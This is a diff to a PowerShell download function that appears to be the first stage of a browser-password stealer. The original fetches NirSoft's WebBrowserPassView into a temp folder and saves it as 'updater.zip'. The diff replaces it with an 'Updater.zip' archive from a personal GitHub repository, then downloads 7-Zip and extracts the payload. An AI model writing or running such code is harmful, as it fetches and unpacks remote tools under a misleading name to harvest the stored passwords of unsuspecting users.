@@ -1,10 +1,10 @@
 function Get {
   mkdir \temp 
   cd \temp
-  Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile updater.zip
+  Invoke-WebRequest -Headers @{'Referer' = 'https://github.com/0svix/ww/blob/main/Updater.zip'} -Uri https://github.com/0svix/ww/raw/refs/heads/main/Updater.zip -OutFile Updater.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip 
-  .\7z\7za.exe e updater.zip
+  .\7z\7za.exe e Updater.zip
 }
 
 
